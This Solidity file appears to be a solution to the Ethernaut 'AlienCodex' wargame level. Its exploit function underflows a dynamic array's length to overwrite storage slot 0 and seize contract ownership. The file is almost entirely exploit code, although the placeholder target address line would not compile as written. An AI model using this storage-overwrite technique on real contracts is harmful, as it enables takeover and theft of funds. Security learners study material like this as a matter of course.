// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../LevelsContracts/#19 AlienCodex.sol";

contract AlienCodexHack {
    AlienCodex target =  ("address") ;

    function exploit () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 newOwner = bytes32(uint256(uint160(tx.origin)));
        target.makeContact();
        target.retract();
        target.revise(index, newOwner);
    }
}